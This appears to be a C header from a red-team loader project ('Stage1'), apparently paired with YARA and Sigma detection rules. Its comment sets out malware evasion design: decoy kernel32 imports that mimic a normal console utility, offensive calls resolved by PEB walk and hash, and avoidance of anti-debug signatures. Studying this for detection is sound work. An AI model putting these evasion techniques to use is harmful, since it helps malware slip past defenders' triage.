/*
 * IAT-shape decoys.
 *
 * Stage1's behaviour is unchanged: every offensive Win32 call still
 * routes through g_api (populated by resolve_apis() in api_table.c via
 * PEB walk + djb2 hashing). This unit exists only to shape the import
 * table so the PE matches the IAT silhouette of a typical small
 * Windows console utility — ~12-15 kernel32 entries — instead of the
 * empty-IAT outlier the prior session produced.
 *
 * Three tiers, by code-path visibility:
 *
 *   A. Pure decoys — addresses stored in a const fnptr array marked
 *      __attribute__((used, retain)). Compiler keeps the array
 *      (`used`); linker keeps its section through --gc-sections
 *      (`retain` → SHF_GNU_RETAIN, GCC 11+). The linker resolves the
 *      symbols against kernel32, producing IAT entries; no call site
 *      ever appears in the disassembly.
 *
 *   B. Light-touch — invoked once on a benign init path. Each result
 *      is mixed into a volatile sink so the optimiser cannot fold the
 *      calls away. Reads in disassembly as routine startup arithmetic.
 *
 *   C. CRT-shape utility — invoked once with discarded results
 *      (NULL unhandled-exception filter, throwaway Wide→Mb conversion,
 *      GetLastError check). Adds the "looks like a normal CRT app
 *      starting up" weight to behavioural triage.
 *
 * Constraints preserved:
 *   - kernel32-only — no wininet / ws2_32 / ntdll explicit imports
 *     (preserves the hidden-fetch property from the PEB-walk session).
 *   - No IsDebuggerPresent + GetTickCount + Sleep cluster (Sleep is
 *     PEB-resolved, IsDebuggerPresent absent) — avoids the anti-debug
 *     ML cluster signature.
 *
 * Detection pairing: detection/yara/stage1_decoy_iat_shape.yar,
 * detection/sigma/stage1_minimal_iat.yml (rewritten this session).
 */

#ifndef DECOYS_H
#define DECOYS_H

#ifdef _WIN32

#include <stdint.h>

/*
 * Execute Tier B + Tier C decoy calls. Returns a sink-derived token
 * the caller XORs into a volatile to keep the calls live.
 *
 * Invoked once from stage1_entry, before resolve_apis(). Touches only
 * kernel32 exports through normal IAT bindings, so it is safe to run
 * before g_api is populated.
 */
uint32_t decoys_run(void);

#endif /* _WIN32 */
#endif /* DECOYS_H */
